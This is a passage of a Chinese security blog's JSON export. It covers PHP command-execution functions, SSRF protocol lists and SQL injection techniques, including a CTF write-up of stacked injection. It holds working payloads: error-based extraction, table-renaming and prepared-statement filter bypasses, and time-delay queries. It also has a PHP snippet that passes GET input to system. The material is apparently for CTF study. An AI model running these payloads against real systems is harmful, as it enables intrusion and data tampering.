resource</code></pre>\n</li>\n<li><p>打开一个指向进程的管道，该进程由派生给定的 <code>command</code> 命令执行而产生。后面的<code>mode</code>，当为’r’时，返回的文件指针等于命令的STDOUT，当为‘w’时,返回的文件指针等于命令的STDIN。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    $handle=popen(&quot;/bin/ls&quot;,&quot;r&quot;);\n?&gt;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>proc_open()</p>\n<ul>\n<li><pre><code class=\"php\">proc_open( \n    string $cmd, \n    array $descriptorspec, \n    array &amp;$pipes\n    [,string $cwd = NULL\n     [, array $env = NULL\n      [, array $other_options = NULL]]] \n) : resource</code></pre>\n</li>\n<li><p>类似 <a href=\"mk:@MSITStore:C:\\Users\\10429\\Desktop\\php_enhanced_zh.chm::/res/function.popen.html\">popen()</a> 函数，但是 <strong>proc_open()</strong> 提供了更加强大的控制程序执行的能力。</p>\n</li>\n</ul>\n</li>\n<li><p><strong>`</strong>(反引号)</p>\n<ul>\n<li><p>在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数shell_exec()相同）。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    echo `whoami`;\n?&gt;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>ob_start()</p>\n<ul>\n<li><pre><code class=\"php\">ob_start(\n    [ callback $output_callback\n     [, int $chunk_size\n      [, bool $erase]]] \n) : bool</code></pre>\n</li>\n<li><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p>\n<p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被(  ob_flush(), ob_clean()  或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用  output_callback 时，它将收到输出缓冲区的内容作为参数  并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p>\n<p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(<em>c<strong>m</strong>d</em>)中的<em>c<strong>m</strong>d</em>，把我们输入的_GET[a]作为cmd的参数。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    $cmd=&#39;system&#39;;\n    ob_start($cmd);\n    echo &quot;$_GET[&#39;a&#39;]&quot;;\n    ob_end_flush();\n?&gt;</code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?a=whoami</code></pre></li>\n</ul>\n</li>\n<li><p>php mail()</p>\n<pre><code class=\"php\">mail( \n    string $to, \n    string $subject, \n    string $message\n    [, string $additional_headers\n    [, string $additional_parameters]] \n) : bool</code></pre>\n<p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项</p>\n<ul>\n<li>配置SMTP服务器的主机名和端口</li>\n<li>配置PHP用作邮件传输代理(MTA)的文件路径</li>\n</ul>\n<p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p>\n</li>\n</ul>\n"},{"title":"OS命令注入Bypass","date":"2021-09-10T06:01:10.178Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# Bypass一些命令注入限制的姿势\n\n## 前置知识\n\n待写。。。\n","source":"_posts/OS命令注入Bypass.md","raw":"---\ntitle: OS命令注入Bypass\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: RCE\ncategories: RCE\n---\n\n\n\n# Bypass一些命令注入限制的姿势\n\n## 前置知识\n\n待写。。。\n","slug":"OS命令注入Bypass","published":1,"updated":"2021-07-27T03:37:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydz0011t8opco0ie6et","content":"<h1 id=\"Bypass一些命令注入限制的姿势\"><a href=\"#Bypass一些命令注入限制的姿势\" class=\"headerlink\" title=\"Bypass一些命令注入限制的姿势\"></a>Bypass一些命令注入限制的姿势</h1><h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>待写。。。</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"Bypass一些命令注入限制的姿势\"><a href=\"#Bypass一些命令注入限制的姿势\" class=\"headerlink\" title=\"Bypass一些命令注入限制的姿势\"></a>Bypass一些命令注入限制的姿势</h1><h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>待写。。。</p>\n"},{"title":"SSRF","date":"2021-09-10T06:01:11.450Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# SSRF\n\n## SSRF中URL的伪协议\n\n### 类型\n\n- file://\n- dict://\n- sftp://\n- ldap://\n- tftp://\n- gopher://\n\n> 参考\n>\n> https://xz.aliyun.com/t/2115\n>\n> https://zhuanlan.zhihu.com/p/73736127\n\n","source":"_posts/SSRF.md","raw":"---\ntitle: SSRF\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: SSRF\ncategories: SSRF\n---\n\n\n\n# SSRF\n\n## SSRF中URL的伪协议\n\n### 类型\n\n- file://\n- dict://\n- sftp://\n- ldap://\n- tftp://\n- gopher://\n\n> 参考\n>\n> https://xz.aliyun.com/t/2115\n>\n> https://zhuanlan.zhihu.com/p/73736127\n\n","slug":"SSRF","published":1,"updated":"2021-07-27T03:34:00.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuye00015t8opaase9pl3","content":"<h1 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h1><h2 id=\"SSRF中URL的伪协议\"><a href=\"#SSRF中URL的伪协议\" class=\"headerlink\" title=\"SSRF中URL的伪协议\"></a>SSRF中URL的伪协议</h2><h3 id=\"类型\"><a href=\"#类型\" class=\"headerlink\" title=\"类型\"></a>类型</h3><ul>\n<li>file://</li>\n<li>dict://</li>\n<li>sftp://</li>\n<li>ldap://</li>\n<li>tftp://</li>\n<li>gopher://</li>\n</ul>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://xz.aliyun.com/t/2115\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2115</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/73736127\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/73736127</a></p>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h1><h2 id=\"SSRF中URL的伪协议\"><a href=\"#SSRF中URL的伪协议\" class=\"headerlink\" title=\"SSRF中URL的伪协议\"></a>SSRF中URL的伪协议</h2><h3 id=\"类型\"><a href=\"#类型\" class=\"headerlink\" title=\"类型\"></a>类型</h3><ul>\n<li>file://</li>\n<li>dict://</li>\n<li>sftp://</li>\n<li>ldap://</li>\n<li>tftp://</li>\n<li>gopher://</li>\n</ul>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://xz.aliyun.com/t/2115\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2115</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/73736127\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/73736127</a></p>\n</blockquote>\n"},{"title":"SQL注入","date":"2021-09-10T06:01:11.137Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# SQL注入\n\n## 联合注入\n\n\n\n## 报错注入\n\n### group by重复键冲突\n\n- 多种形式payload：\n\n  ```sql\n  select count(*),(concat(floor(rand(0)*2),'%',(select version()),'%'))x from information_schema.tables group by x;\n  ```\n\n  ```sql\n  select concat(left(rand(),3),'%',(select version()),'%')x,count(*) from information_schema.tables group by x;\n  ```\n\n  注：输出字符长度限制为64个字符\n\n### XPATH报错\n\n在MySQL高于5.1版本中添加了对XML文档进行查询和修改的函数:\n\n- extractvalue()\n\n  ```sql\n  EXTRACTVALUE (XML_document, XPath_string);\n  ```\n\n  - 对XML文档进行查询的函数\n  - 语法：extractvalue(目标xml文档，xml路径)\n\n  ```sql\n  ?id=1 and extractvalue(1,concat('%',(select version()),'%')) --+\n  ```\n\n- updatexml()\n\n  - updatexml()函数与extractvalue()类似，是更新xml文档的函数\n  - 语法：updatexml(目标xml文档，xml路径，更新的内容)\n\n  ```sql\n  ?id=1 and updatexml(1,concat('%',(select version()),'%'),1) --+\n  ```\n\n当这两个函数在执行时,如果出现xml文档路径错误就会产生\n\n注：输出字符有长度限制，最长32位\n\n### ExtractValue报错\n\n```sql\nand extractvalue(1, payload)\nand extractvalue(1, concat(0x7e,@@version,0x7e))\n```\n\n注：输出字符有长度限制，最长32位\n\n## 堆叠注入\n\n什么是堆叠注入：使用分号结束上一个语句再叠加其他语句一起执行\n\n[参考](https://zhuanlan.zhihu.com/p/78989602)\n\n例题来自BUUCTF-[强网杯 2019]随便注1\n\n- 打开后查看源码![image-20201115212459552](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212459552.png)![image-20201115212514056](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212514056.png)\n\n- 所以就手工注入吧。尝试单引号，发现报错\n\n  ![image-20201115212619437](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212619437.png)\n\n  显然是但引号闭合，尝试闭合，发现没问题![image-20201115212729519](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212729519.png)\n\n- 有报错，有回显，那就从**联合注入**开始。发现到order by 3时报错，即有两个字段![image-20201115212924226](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212924226.png)\n\n- select查询发现被过滤![image-20201115213016731](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213016731.png)\n\n- **多行注释**、**大小写**、**双写**均无法绕过，并且由于update被过滤，无法用**updatexml报错**，尝试**ExtractValue报错**![image-20201115213531495](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213531495.png)\n\n- **ExtractValue报错**可行，不过也到此为止。这时考虑**堆叠注入**，发现可行![image-20201115213647092](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213647092.png)\n\n- 查出当前可查的表![image-20201115214021920](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214021920.png)\n\n- 用desc查看表结构的详细信息![image-20201115214113905](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214113905.png)\n\n  此处查询表名为数字、关键字时，使用反引号将其包裹，否则会出现错误![image-20201115215139041](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115215139041.png)\n\n- 我们可以得知flag存在于supersqli数据库中\\`1919810931114514\\`表的flag字段。\n\n- 最终payload有两种\n\n  - 预编译相关语法如下：\n  \n    ```text\n    set用于设置变量名和值\n    prepare用于预备一个语句，并赋予名称，以后可以引用该语句\n    execute执行语句\n    deallocate prepare用来释放掉预处理的语句\n    ```\n\n    ```sql\n    -1';set @sql = CONCAT('se','lect * from   `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#\n    \n    拆分开来如下\n    -1';\n    set @sql = CONCAT('se','lect * from `1919810931114514`;');\n    prepare stmt from @sql;\n    EXECUTE stmt;\n    #\n    ```\n    \n    结果为：![image-20201115220307215](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220307215.png)\n    \n    这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。\n    \n    ```mysql\n    -1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#\n    \n    拆分开来如下：\n    -1';\n    Set @sql = CONCAT('se','lect * from `1919810931114514`;');\n    Prepare stmt from @sql;\n    EXECUTE stmt;\n    #\n    ```\n    \n    结果为：![image-20201115220501035](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220501035.png)\n    \n  - **更改表名列名**\n  \n    修改表名和列名的语法如下：\n    \n    ```text\n    修改表名(将表名user改为users)\n    alter table user rename to users;\n    \n    修改列名(将字段名username改为name)\n    alter table users change uesrname name varchar(30);\n    ```\n    \n    最终payload如下：\n    \n    ```mysql\n    1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#\n    \n    拆分开来如下\n    1';\n    alter table words rename to words1;\n    alter table `1919810931114514` rename to words;\n    alter table words change flag id varchar(50);\n    #\n    ```\n    \n    然后使用`1' or 1=1#`即可查询出flag\n\n## 布尔注入\n\n## 时间盲注\n\n### sleep\n\n\n\n### benchmark\n\n\n\n### heavy query\n\nheavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。\n\n- 笛卡尔积\n\n  ```sql\n  SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;\n  ```\n\n- get_lock\n\n  延时精确可控，利用环境有限，需要开两个session测试。\n\n  ```sql\n  select get_lock('test',1);\n  ```\n\n  ```sql\n  select get_lock('test',5);\n  ```\n\n- rlike\n\n  通过`rpad`或`repeat`构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。\n\n  ```sql\n  select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');\n  ```\n\n  \n\n","source":"_posts/SQL注入.md","raw":"---\ntitle: SQL注入\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: SQL注入\ncategories: SQL注入\n---\n\n\n\n# SQL注入\n\n## 联合注入\n\n\n\n## 报错注入\n\n### group by重复键冲突\n\n- 多种形式payload：\n\n  ```sql\n  select count(*),(concat(floor(rand(0)*2),'%',(select version()),'%'))x from information_schema.tables group by x;\n  ```\n\n  ```sql\n  select concat(left(rand(),3),'%',(select version()),'%')x,count(*) from information_schema.tables group by x;\n  ```\n\n  注：输出字符长度限制为64个字符\n\n### XPATH报错\n\n在MySQL高于5.1版本中添加了对XML文档进行查询和修改的函数:\n\n- extractvalue()\n\n  ```sql\n  EXTRACTVALUE (XML_document, XPath_string);\n  ```\n\n  - 对XML文档进行查询的函数\n  - 语法：extractvalue(目标xml文档，xml路径)\n\n  ```sql\n  ?id=1 and extractvalue(1,concat('%',(select version()),'%')) --+\n  ```\n\n- updatexml()\n\n  - updatexml()函数与extractvalue()类似，是更新xml文档的函数\n  - 语法：updatexml(目标xml文档，xml路径，更新的内容)\n\n  ```sql\n  ?id=1 and updatexml(1,concat('%',(select version()),'%'),1) --+\n  ```\n\n当这两个函数在执行时,如果出现xml文档路径错误就会产生\n\n注：输出字符有长度限制，最长32位\n\n### ExtractValue报错\n\n```sql\nand extractvalue(1, payload)\nand extractvalue(1, concat(0x7e,@@version,0x7e))\n```\n\n注：输出字符有长度限制，最长32位\n\n## 堆叠注入\n\n什么是堆叠注入：使用分号结束上一个语句再叠加其他语句一起执行\n\n[参考](https://zhuanlan.zhihu.com/p/78989602)\n\n例题来自BUUCTF-[强网杯 2019]随便注1\n\n- 打开后查看源码![image-20201115212459552](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212459552.png)![image-20201115212514056](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212514056.png)\n\n- 所以就手工注入吧。尝试单引号，发现报错\n\n  ![image-20201115212619437](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212619437.png)\n\n  显然是但引号闭合，尝试闭合，发现没问题![image-20201115212729519](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212729519.png)\n\n- 有报错，有回显，那就从**联合注入**开始。发现到order by 3时报错，即有两个字段![image-20201115212924226](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212924226.png)\n\n- select查询发现被过滤![image-20201115213016731](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213016731.png)\n\n- **多行注释**、**大小写**、**双写**均无法绕过，并且由于update被过滤，无法用**updatexml报错**，尝试**ExtractValue报错**![image-20201115213531495](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213531495.png)\n\n- **ExtractValue报错**可行，不过也到此为止。这时考虑**堆叠注入**，发现可行![image-20201115213647092](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213647092.png)\n\n- 查出当前可查的表![image-20201115214021920](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214021920.png)\n\n- 用desc查看表结构的详细信息![image-20201115214113905](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214113905.png)\n\n  此处查询表名为数字、关键字时，使用反引号将其包裹，否则会出现错误![image-20201115215139041](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115215139041.png)\n\n- 我们可以得知flag存在于supersqli数据库中\\`1919810931114514\\`表的flag字段。\n\n- 最终payload有两种\n\n  - 预编译相关语法如下：\n  \n    ```text\n    set用于设置变量名和值\n    prepare用于预备一个语句，并赋予名称，以后可以引用该语句\n    execute执行语句\n    deallocate prepare用来释放掉预处理的语句\n    ```\n\n    ```sql\n    -1';set @sql = CONCAT('se','lect * from   `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#\n    \n    拆分开来如下\n    -1';\n    set @sql = CONCAT('se','lect * from `1919810931114514`;');\n    prepare stmt from @sql;\n    EXECUTE stmt;\n    #\n    ```\n    \n    结果为：![image-20201115220307215](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220307215.png)\n    \n    这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。\n    \n    ```mysql\n    -1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#\n    \n    拆分开来如下：\n    -1';\n    Set @sql = CONCAT('se','lect * from `1919810931114514`;');\n    Prepare stmt from @sql;\n    EXECUTE stmt;\n    #\n    ```\n    \n    结果为：![image-20201115220501035](https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220501035.png)\n    \n  - **更改表名列名**\n  \n    修改表名和列名的语法如下：\n    \n    ```text\n    修改表名(将表名user改为users)\n    alter table user rename to users;\n    \n    修改列名(将字段名username改为name)\n    alter table users change uesrname name varchar(30);\n    ```\n    \n    最终payload如下：\n    \n    ```mysql\n    1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#\n    \n    拆分开来如下\n    1';\n    alter table words rename to words1;\n    alter table `1919810931114514` rename to words;\n    alter table words change flag id varchar(50);\n    #\n    ```\n    \n    然后使用`1' or 1=1#`即可查询出flag\n\n## 布尔注入\n\n## 时间盲注\n\n### sleep\n\n\n\n### benchmark\n\n\n\n### heavy query\n\nheavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。\n\n- 笛卡尔积\n\n  ```sql\n  SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;\n  ```\n\n- get_lock\n\n  延时精确可控，利用环境有限，需要开两个session测试。\n\n  ```sql\n  select get_lock('test',1);\n  ```\n\n  ```sql\n  select get_lock('test',5);\n  ```\n\n- rlike\n\n  通过`rpad`或`repeat`构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。\n\n  ```sql\n  select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');\n  ```\n\n  \n\n","slug":"SQL注入","published":1,"updated":"2021-07-27T03:34:19.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuye10016t8op7prb9449","content":"<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><h2 id=\"联合注入\"><a href=\"#联合注入\" class=\"headerlink\" title=\"联合注入\"></a>联合注入</h2><h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><h3 id=\"group-by重复键冲突\"><a href=\"#group-by重复键冲突\" class=\"headerlink\" title=\"group by重复键冲突\"></a>group by重复键冲突</h3><ul>\n<li><p>多种形式payload：</p>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">(</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>x <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span><span class=\"token keyword\">left</span><span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">)</span>x<span class=\"token punctuation\">,</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>注：输出字符长度限制为64个字符</p>\n</li>\n</ul>\n<h3 id=\"XPATH报错\"><a href=\"#XPATH报错\" class=\"headerlink\" title=\"XPATH报错\"></a>XPATH报错</h3><p>在MySQL高于5.1版本中添加了对XML文档进行查询和修改的函数:</p>\n<ul>\n<li><p>extractvalue()</p>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">EXTRACTVALUE <span class=\"token punctuation\">(</span>XML_document<span class=\"token punctuation\">,</span> XPath_string<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>对XML文档进行查询的函数</li>\n<li>语法：extractvalue(目标xml文档，xml路径)</li>\n</ul>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\" spellcheck=\"true\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>updatexml()</p>\n<ul>\n<li>updatexml()函数与extractvalue()类似，是更新xml文档的函数</li>\n<li>语法：updatexml(目标xml文档，xml路径，更新的内容)</li>\n</ul>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\" spellcheck=\"true\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ul>\n<p>当这两个函数在执行时,如果出现xml文档路径错误就会产生</p>\n<p>注：输出字符有长度限制，最长32位</p>\n<h3 id=\"ExtractValue报错\"><a href=\"#ExtractValue报错\" class=\"headerlink\" title=\"ExtractValue报错\"></a>ExtractValue报错</h3><pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@version</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>注：输出字符有长度限制，最长32位</p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p>什么是堆叠注入：使用分号结束上一个语句再叠加其他语句一起执行</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/78989602\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<p>例题来自BUUCTF-[强网杯 2019]随便注1</p>\n<ul>\n<li><p>打开后查看源码<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212459552.png\" alt=\"image-20201115212459552\"><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212514056.png\" alt=\"image-20201115212514056\"></p>\n</li>\n<li><p>所以就手工注入吧。尝试单引号，发现报错</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212619437.png\" alt=\"image-20201115212619437\"></p>\n<p>显然是但引号闭合，尝试闭合，发现没问题<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212729519.png\" alt=\"image-20201115212729519\"></p>\n</li>\n<li><p>有报错，有回显，那就从<strong>联合注入</strong>开始。发现到order by 3时报错，即有两个字段<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212924226.png\" alt=\"image-20201115212924226\"></p>\n</li>\n<li><p>select查询发现被过滤<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213016731.png\" alt=\"image-20201115213016731\"></p>\n</li>\n<li><p><strong>多行注释</strong>、<strong>大小写</strong>、<strong>双写</strong>均无法绕过，并且由于update被过滤，无法用<strong>updatexml报错</strong>，尝试<strong>ExtractValue报错</strong><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213531495.png\" alt=\"image-20201115213531495\"></p>\n</li>\n<li><p><strong>ExtractValue报错</strong>可行，不过也到此为止。这时考虑<strong>堆叠注入</strong>，发现可行<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213647092.png\" alt=\"image-20201115213647092\"></p>\n</li>\n<li><p>查出当前可查的表<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214021920.png\" alt=\"image-20201115214021920\"></p>\n</li>\n<li><p>用desc查看表结构的详细信息<img 